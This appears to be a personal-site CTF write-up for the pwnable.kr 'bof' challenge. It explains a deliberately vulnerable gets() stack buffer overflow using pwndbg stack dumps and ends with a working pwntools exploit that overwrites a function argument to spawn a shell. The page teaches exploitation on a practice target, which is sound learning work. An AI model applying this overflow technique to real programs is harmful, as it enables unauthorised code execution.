<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>emile.space</title>

  <style>
  * { word-wrap:break-word !important; font-family: monospace;
  margin: 0; padding: 0; }

/* light/darktheme specific foo */
@media (prefers-color-scheme: light) {
    html { background: #fff; color: #000; }
    a { color: #000; background: #fff; text-decoration: none;}
    a:not([href*="webring.xxiivv.com"]):hover, a:active { color: #fff; background: #000 }
    nav a:hover, a:active { color: #000; background: #fff }
    nav { margin: 1ex 0; background: #eee; }
    nav a { display:block; background: #eee; }
    h1 { margin: 3ex 0 1ex 0; width: 100%; background-color: #eee}
    h2 { margin: 2ex 0 1ex 0; width: 100%; background-color: #eee}
    h3 { margin: 1ex 0 1ex 0; width: 100%; /*background-color: #eee*/}
    .code { border-left: 1px solid #000; padding-left: 1ex; }
}
@media (prefers-color-scheme: dark) {
    html { background: #000; color: #fff; }
    a { color: #fff; background: #000; text-decoration: none; }
    a:not([href*="webring.xxiivv.com"]):hover, a:active { color: #000; background: #fff }
    nav a:hover, a:active { color: #fff; background: #000 }
    nav { margin: 1ex 0; background: #fff; }
    nav a { display:block; background: #fff; }
    h1 { margin: 3ex 0 1ex 0; width: 100%; background-color: #fff}
    h2 { margin: 2ex 0 1ex 0; width: 100%; background-color: #fff}
    h3 { margin: 1ex 0 1ex 0; width: 100%; /*background-color: #fff*/}
    .code { border-left: 1px solid #fff; padding-left: 1ex; }
    .webring { -webkit-filter: invert(100%); filter: invert(100%); }
}

/* settings for mobile devices*/
@media only screen and (max-width: 768px) {
  body { margin: 1ex; width: calc(100% - 2ex) !important; }
  img { max-width: 100% !important; max-height: 400px; }
}
img { max-width: 100ex; max-height: 400px; }

body { margin-left: auto; margin-right: auto; margin-top: 1ex; margin-bottom: 1ex; width: 100ex; }


.webring { align: right; }
a .webring { float: right; }

/* display local links using [] and external links using {} */
body pre a:not([href*="webring.xxiivv.com"]):before { content: "["; }
body pre a:not([href*="webring.xxiivv.com"]):after { content: "]"; }
a[href*="//"]:not([href*="emile.space"]):not([class*="icon"]):before {
  content: '{';
}
a[href*="//"]:not([href*="emile.space"]):not([class*="icon"]):after {
  content: '}';
}


ul { list-style-type: none; }

/* navigation bar magic */
nav * { color: #000; }
nav ul { list-style: none; position: relative; display: inline-block; }
nav ul li { display:inline-block; }
nav ul ul { display: none; position: absolute; border: 1px solid #000; background-color: #ff0; }
nav ul ul li { width: 100%; padding-right: 1ex; float:none; display:list-item; position: relative; }
nav + ul li { display: inline-block;}

/* only display the hover dropdown on non-mobile devices */
@media only screen and (min-width: 768px) {
  nav ul li:hover a + ul { display: inherit; white-space: nowrap; }
}

/* nav bar spacing char */
nav ul li > a::after { content: " /"; }
nav ul li > a:only-child::after { content: ""; }
nav ul li:last-of-type a::after { content: ""; }

h1 a, h2 a, h3 a { padding-right: 1ex; }

pre { white-space: pre-wrap; }

/* display the list of folders in the current one as a vertical list, if the
 * .vert class is present */
nav + ul.vert li { display: block; }

.w-100 { width: 100%; }


  </style>
</head>
    
<body>
  <header>
    <a href="/">emile.space</a>
  </header>
  <nav>
    <ul>
        <li>
            <a href="/ctf">ctf</a>
            <ul>
                <li><a href="/about">about/</a></li>
                <li><a href="/blog">blog/</a></li>
                <li><a href="/events">events/</a></li>
                <li><a href="/files">files/</a></li>
                <li><a href="/projects">projects/</a></li>
                <li><a href="/publications">publications/</a></li>
                <li><a href="/sport">sport/</a></li>
                <li><a href="/talks">talks/</a></li>
                <li><a href="/workshops">workshops/</a></li>
            </ul>
        </li>
        <li>
            <a href="/ctf/writeups">writeups</a>
            <ul>
                <li><a href="/ctf/hosted-events">hosted-events/</a></li>
                <li><a href="/ctf/resources">resources/</a></li>
                <li><a href="/ctf/teams">teams/</a></li>
            </ul>
        </li>
        <li>
            <a href="/ctf/writeups/pwnable.kr">pwnable.kr</a>
            <ul>
                <li><a href="/ctf/writeups/2019">2019/</a></li>
                <li><a href="/ctf/writeups/2020">2020/</a></li>
                <li><a href="/ctf/writeups/2021">2021/</a></li>
            </ul>
        </li>
        <li>
            <a href="/ctf/writeups/pwnable.kr/bof">bof</a>
            <ul>
                <li><a href="/ctf/writeups/pwnable.kr/collision">collision/</a></li>
                <li><a href="/ctf/writeups/pwnable.kr/fd">fd/</a></li>
                <li><a href="/ctf/writeups/pwnable.kr/flag">flag/</a></li>
            </ul>
        </li>
    </ul>
  </nav>
  <ul>
  </ul><pre></pre>
            <span id="bof"></span>
            <h1><a href="#bof">bof</a></h1>
            <pre>
</pre><pre class="code">Nana told me that buffer overflow is one of the most common software vulnerability. </pre><pre>
</pre><pre class="code">Is that true?</pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">Download : http://pwnable.kr/bin/bof</pre><pre>
</pre><pre class="code">Download : http://pwnable.kr/bin/bof.c</pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">Running at : nc pwnable.kr 9000</pre><pre>


The title of this challenge hints that this challenge has to do with buffer overflows.


</pre>
            <span id="what-is-given"></span>
            <h2><a href="#what-is-given">What is given?</a></h2>
            <pre>
We get a binary (bof) and the source that can be compiled to build the binary ourselves (bof.c).

The source if fairly short:


</pre><pre class="code">#include &ltstdio.h></pre><pre>
</pre><pre class="code">#include &ltstring.h></pre><pre>
</pre><pre class="code">#include &ltstdlib.h></pre><pre>
</pre><pre class="code">void func(int key){</pre><pre>
</pre><pre class="code">        char overflowme[32];</pre><pre>
</pre><pre class="code">        printf("overflow me : ");</pre><pre>
</pre><pre class="code">        gets(overflowme);       // smash me!</pre><pre>
</pre><pre class="code">        if(key == 0xcafebabe){</pre><pre>
</pre><pre class="code">                system("/bin/sh");</pre><pre>
</pre><pre class="code">        }</pre><pre>
</pre><pre class="code">        else{</pre><pre>
</pre><pre class="code">                printf("Nah..\n");</pre><pre>
</pre><pre class="code">        }</pre><pre>
</pre><pre class="code">}</pre><pre>
</pre><pre class="code">int main(int argc, char* argv[]){</pre><pre>
</pre><pre class="code">        func(0xdeadbeef);</pre><pre>
</pre><pre class="code">        return 0;</pre><pre>
</pre><pre class="code">}</pre><pre>


</pre>
            <span id="understanding-the-source"></span>
            <h2><a href="#understanding-the-source">Understanding the source</a></h2>
            <pre>
Let's understand the source! First of all, let's split up the source into it's three main components: the imports, the func function and the main function.


</pre><pre class="code">#include &ltstdio.h></pre><pre>
</pre><pre class="code">#include &ltstring.h></pre><pre>
</pre><pre class="code">#include &ltstdlib.h></pre><pre>


The imports are there for making string handling and other stuff easier, nothing special here.

Before we look at the func function, let's get a quick look at the main function, as it isn't really long and calls the func function (You might notice we're going "into" the code now, starting at the "main" and working our way into the action).


</pre><pre class="code">int main(int argc, char* argv[]){</pre><pre>
</pre><pre class="code">        func(0xdeadbeef);</pre><pre>
</pre><pre class="code">        return 0;</pre><pre>
</pre><pre class="code">}</pre><pre>


The main function is fairly basic. It receives the amount of arguments passted into the binary (argc) and list of strings containing the arguments (argv), but doesn't use them. Instead the func function is called with 0xdeadbeef as an argument.

In the end, the function returns 0, so there isn't really much going on here. Let's now take a look at the func function:


</pre><pre class="code">void func(int key){</pre><pre>
</pre><pre class="code">        char overflowme[32];</pre><pre>
</pre><pre class="code">        printf("overflow me : ");</pre><pre>
</pre><pre class="code">        gets(overflowme);       // smash me!</pre><pre>
</pre><pre class="code">        if(key == 0xcafebabe){</pre><pre>
</pre><pre class="code">                system("/bin/sh");</pre><pre>
</pre><pre class="code">        }</pre><pre>
</pre><pre class="code">        else{</pre><pre>
</pre><pre class="code">                printf("Nah..\n");</pre><pre>
</pre><pre class="code">        }</pre><pre>
</pre><pre class="code">}</pre><pre>


There's a lot more happening here, let's go through it line by line:


</pre><pre class="code">void func(int key){</pre><pre>


The function signature tells us, that the function receives one argument, named key that is an integer and returns void, thus nothing. We know that the argument given is 0xdeadbeef, as seen in the main function. (Don't panic: altough 0xdeadbeef might look like a string, the 0x prefix indicates that it is actually a <a href="https://en.wikipedia.org/wiki/Hexadecimal">hexadecimal</a> value and thus just the representation of 3735928559 in base 16, which by coincidence is completely made up of letters).


</pre><pre class="code">        char overflowme[32];</pre><pre>


The next part initializes a 32 bytes big char buffer called overflowme, we'll get to what that is ment to say in a minute...


</pre><pre class="code">        printf("overflow me : ");</pre><pre>


...here, "overflow me : " is printed out, a pretty clear instruction...


</pre><pre class="code">        gets(overflowme);       // smash me!</pre><pre>


...and here, a comment indicates that we should smash it! Now let's get into the problems of buffer overflows and the problem presented here. This line calls the gets function using the buffer overflowme created before as it's first argument. Let's look at the manpage of gets ($ man gets):


</pre><pre class="code">NAME</pre><pre>
</pre><pre class="code">       gets - get a string from standard input (DEPRECATED)</pre><pre>


This tells us the name of the function (gets) and in a few words what it's supposed to do, namely get a string from the standard input (File descriptor 0).


</pre><pre class="code">SYNOPSIS</pre><pre>
</pre><pre class="code">       #include &ltstdio.h></pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">       char *gets(char *s);</pre><pre>


This tells us how to use get's, it tells us to include the stdio.h library and then use the get's function, by passing in a char pointer.

The Description then starts fairly direct:


</pre><pre class="code">DESCRIPTION</pre><pre>
</pre><pre class="code">       Never use this function.</pre><pre>


Now you might ask yourself: "why not use gets?", as you might want to do exactly what this function is ment to do, get a string from the standard input. Well let's read on...


</pre><pre class="code">       gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\0').  No check for buffer overrun is performed (see BUGS below).</pre><pre>


Well, this is a problem. What this says is that if we've got a buffer of, for example, size 4 and read 10 bytes from the standard input, the 10 bytes will be written into the buffer, as not bound checks are performed.


</pre><pre class="code">0x0 | _ _ _ _ | &lt- the 4 bytes big buffer</pre><pre>
</pre><pre class="code">0x4 | _ _ _ _ |</pre><pre>
</pre><pre class="code">0x8 | _ _ _ _ |</pre><pre>


Now if we use get's to fill this buffer, we can write past the end of the buffer into what is stored on the stack beneath it. For understanding how we can do bad stuff with this, let's quickly look at the rest of the function, so that you know what our actual goal is:


</pre><pre class="code">        if(key == 0xcafebabe){</pre><pre>
</pre><pre class="code">                system("/bin/sh");</pre><pre>
</pre><pre class="code">        }</pre><pre>
</pre><pre class="code">        else{</pre><pre>
</pre><pre class="code">                printf("Nah..\n");</pre><pre>
</pre><pre class="code">        }</pre><pre>
</pre><pre class="code">}</pre><pre>


This checks if the key (the argument given into the function before (0xdeadbeef)) equals 0xcafebabe. If so, we get a shell (system("/bin/sh")). If not, we get a message telling us Nah...

Now the key 0xdeadbeef doesn't equal 0xcafebabe, that should be quite clear. In order for them to be equal, we'de have to change one of them to the correct value, but we can't, as we control neither of the values. But don't loose hope! We do have control over a buffer into which we can write and we can even write over it's boundaries. Now imagine that the buffer is located at some place in memory and the key variable is located somehere else behind it, so that when we write over the bounds of the buffer, we can overwrite the content of key with some arbitrary content. That sounds great, doesn't it? Well, that's exactly what we're going to do.

Let's clean up your understanding a bit more: When calling a function in 32-bit x86, all arguments are pushed onto the stack (See the <a href="https://en.wikipedia.org/wiki/X86_calling_conventions">x86 calling conventions</a> for more information regarding this). This means that when a new function is called, the stack contains the following values:


</pre><pre class="code">0x0000</pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">......  buffer</pre><pre>
</pre><pre class="code">......  argument 1</pre><pre>
</pre><pre class="code">......  Saved return address (eip)</pre><pre>
</pre><pre class="code">......  Saved Base Pointer (ebp)</pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">0xffff</pre><pre>


Do keep in mind that the stack grows from the high adresses to the low addresses, so in the graphic above, if you'd insert another value, you'd put it above the "buffer". When writing into a buffer, we write from the low to the high addresses. This means that if we write past the bounds of the buffer, we overwrite the values previously pushed onto the stack.

If we'd write this down a bit more like in "reality", we'd get something like this:


</pre><pre class="code">pwndbg> stack 20</pre><pre>
</pre><pre class="code">00:0000│ esp 0xffffd6c0 —▸ 0xffffd6dc ◂— 'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD'</pre><pre>
</pre><pre class="code">01:0004│     0xffffd6c4 ◂— 0x0</pre><pre>
</pre><pre class="code">02:0008│     0xffffd6c8 —▸ 0xf7ffd000 ◂— 0x2cf44</pre><pre>
</pre><pre class="code">03:000c│     0xffffd6cc ◂— 0x0</pre><pre>
</pre><pre class="code">04:0010│     0xffffd6d0 ◂— 0x0</pre><pre>
</pre><pre class="code">05:0014│     0xffffd6d4 ◂— 0x8e</pre><pre>
</pre><pre class="code">06:0018│     0xffffd6d8 ◂— 0x800000</pre><pre>
</pre><pre class="code">07:001c│ eax 0xffffd6dc ◂— 'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD'</pre><pre>
</pre><pre class="code">08:0020│     0xffffd6e0 ◂— 'AAAABBBBBBBBCCCCCCCCDDDDDDDD'</pre><pre>
</pre><pre class="code">09:0024│     0xffffd6e4 ◂— 'BBBBBBBBCCCCCCCCDDDDDDDD'</pre><pre>
</pre><pre class="code">0a:0028│     0xffffd6e8 ◂— 'BBBBCCCCCCCCDDDDDDDD'</pre><pre>
</pre><pre class="code">0b:002c│     0xffffd6ec ◂— 'CCCCCCCCDDDDDDDD'</pre><pre>
</pre><pre class="code">0c:0030│     0xffffd6f0 ◂— 'CCCCDDDDDDDD'</pre><pre>
</pre><pre class="code">0d:0034│     0xffffd6f4 ◂— 'DDDDDDDD'</pre><pre>
</pre><pre class="code">0e:0038│     0xffffd6f8 ◂— 'DDDD'</pre><pre>
</pre><pre class="code">0f:003c│     0xffffd6fc ◂— 0xaec67700</pre><pre>
</pre><pre class="code">10:0040│     0xffffd700 —▸ 0x56556ff4 ◂— 0x1f14</pre><pre>
</pre><pre class="code">11:0044│     0xffffd704 —▸ 0xf7fbb000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1f2d6c</pre><pre>
</pre><pre class="code">12:0048│ ebp 0xffffd708 —▸ 0xffffd728 ◂— 0x0</pre><pre>
</pre><pre class="code">13:004c│     0xffffd70c —▸ 0x5655569f (main+21)</pre><pre>
</pre><pre class="code">14:0050│     0xffffd710 ◂— 0xdeadbeef</pre><pre>


I'm using the Gnu DeBugger <a href="https://www.gnu.org/software/gdb/">gdb</a> here in combination with <a href="https://github.com/pwndbg/pwndbg">pwndbg</a> for having a nice interface that doesn't rely on me memorizing dozens of obscure commands.

The graphic above displays the entries on the stack. The first column shows us the nuber of the element, starting at the top of the stack with the offset. After the pipe, there's a column in which three registers are displayed (esp, eax and ebp). This is a nice feature of pwndbg, namely pwndbg realized that we are looking at values with some registers containing those addresses, meaning that for example, the stack pointer esp is pointing to the top of the stack, so pwndbg displays this. The next column contains the address of the value. As the stack is stored in memory, the position of values on the stack can be defined using a memory address. For example, the stack pointer esp, currently contains the value 0xffffd6c0.

Now let's get into the interesting part: the values entered. I've executed the binary and entered AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD (you might have guessed that by now). Now you might ask yourself why pwndbg displays that value as weirdly as it is from the stack values 07 to 0e. Well, the string is contained in that memory region, it's just pwndbg trying to be helpful by displaying the whole string from that point on.

The more interesting part start's below here:


</pre><pre class="code">0e:0038│     0xffffd6f8 ◂— 'DDDD'</pre><pre>
</pre><pre class="code">0f:003c│     0xffffd6fc ◂— 0xaec67700</pre><pre>
</pre><pre class="code">10:0040│     0xffffd700 —▸ 0x56556ff4 ◂— 0x1f14</pre><pre>
</pre><pre class="code">11:0044│     0xffffd704 —▸ 0xf7fbb000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1f2d6c</pre><pre>
</pre><pre class="code">12:0048│ ebp 0xffffd708 —▸ 0xffffd728 ◂— 0x0</pre><pre>


The top line contains the last bytes of our 32 bytes long string. Now if out input would be checked, as in: it should be at most 32 bytes long, this wouldn't be a problem, but as we can enter an input with an arbitrary length, we can overwrite past the bounds of the buffer. If we input a string longer than 32 bytes, for example 56 bytes, we can overwrite the values after 0xffffd6fc:


</pre><pre class="code">0e:0038│     0xffffd6f8 ◂— 'DDDDEEEEEEEEFFFFFFFF'</pre><pre>
</pre><pre class="code">0f:003c│     0xffffd6fc ◂— 'EEEEEEEEFFFFFFFF'</pre><pre>
</pre><pre class="code">10:0040│     0xffffd700 ◂— 'EEEEFFFFFFFF'</pre><pre>
</pre><pre class="code">11:0044│     0xffffd704 ◂— 'FFFFFFFF'</pre><pre>
</pre><pre class="code">12:0048│ ebp 0xffffd708 ◂— 'FFFF'</pre><pre>


As you can see above, the input didn't stop with DDDD, but was longer than 32 bytes containing the previous string concatinated with EEEEEEEEFFFFFFFF. This means that we could replace EEEEEEEEFFFFFFFF with arbitrary values that would corrupt the control flow, as the binary uses the values stored on the stack to determine what to do, when done executing the function.


</pre>
            <span id="exploiting"></span>
            <h2><a href="#exploiting">Exploiting</a></h2>
            <pre>
For now, we only need to overwrite the 0xdeadbeef value passed as an argument to the func function. For this, we need to locate the value in memory (on the stack) in order to determine how much memory we need to overwrite in order to overwrite 0xdeadbeef.

Here an extraction from the original input (AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD) which did fit perfectly into our buffer:


</pre><pre class="code">...</pre><pre>
</pre><pre class="code">07:001c│ eax 0xffffd6dc ◂— 'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD'</pre><pre>
</pre><pre class="code">08:0020│     0xffffd6e0 ◂— 'AAAABBBBBBBBCCCCCCCCDDDDDDDD'</pre><pre>
</pre><pre class="code">09:0024│     0xffffd6e4 ◂— 'BBBBBBBBCCCCCCCCDDDDDDDD'</pre><pre>
</pre><pre class="code">0a:0028│     0xffffd6e8 ◂— 'BBBBCCCCCCCCDDDDDDDD'</pre><pre>
</pre><pre class="code">0b:002c│     0xffffd6ec ◂— 'CCCCCCCCDDDDDDDD'</pre><pre>
</pre><pre class="code">0c:0030│     0xffffd6f0 ◂— 'CCCCDDDDDDDD'</pre><pre>
</pre><pre class="code">0d:0034│     0xffffd6f4 ◂— 'DDDDDDDD'</pre><pre>
</pre><pre class="code">0e:0038│     0xffffd6f8 ◂— 'DDDD'</pre><pre>
</pre><pre class="code">0f:003c│     0xffffd6fc ◂— 0xaec67700</pre><pre>
</pre><pre class="code">10:0040│     0xffffd700 —▸ 0x56556ff4 ◂— 0x1f14</pre><pre>
</pre><pre class="code">11:0044│     0xffffd704 —▸ 0xf7fbb000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1f2d6c</pre><pre>
</pre><pre class="code">12:0048│ ebp 0xffffd708 —▸ 0xffffd728 ◂— 0x0</pre><pre>
</pre><pre class="code">13:004c│     0xffffd70c —▸ 0x5655569f (main+21)</pre><pre>
</pre><pre class="code">14:0050│     0xffffd710 ◂— 0xdeadbeef</pre><pre>
</pre><pre class="code">...</pre><pre>


The stack is 4 bytes "wide", so our string is split up into 8 lines, we can see the 0xdeadbeef value passed into the function at the bottom. In order to override this, we thus have to write 32 bytes to fill the buffer, 5 * 4 bytes in order to overwrite the space between the buffer and the value we want to overwrite and then four more bytes in order to overwrite 0xdeadbeef with 0xcafebabe:

So in the end, this simple "exploit" looks like this:


</pre><pre class="code">from pwn import *</pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">#p = remote('pwnable.kr', 9000)</pre><pre>
</pre><pre class="code">p = process('./bof')</pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">payload = (32 * 'A') + ((5 * 4) * 'B') + '\xbe\xba\xfe\xca' + "\n"</pre><pre>
</pre><pre class="code">p.sendlineafter("overflow me :", payload)</pre><pre>
</pre><pre class="code">p.interactive()</pre><pre>
<br>
    <br>
    <br>
    </pre>
<a href="https://lieu.cblgh.org/" target="_blank" rel="noopener" class="icon"><img class="webring" src="/lieu.svg" alt="lieu webring search engine" height="32px"/></a>
<a href="https://webring.xxiivv.com/#emile" target="_blank" rel="noopener" class="icon"><img class="webring" src="/webring.svg" alt="XXIIVV webring" height="32px"/></a>
    <pre>
emile - 1667082414.868289s
</body>
</html>
    <pre>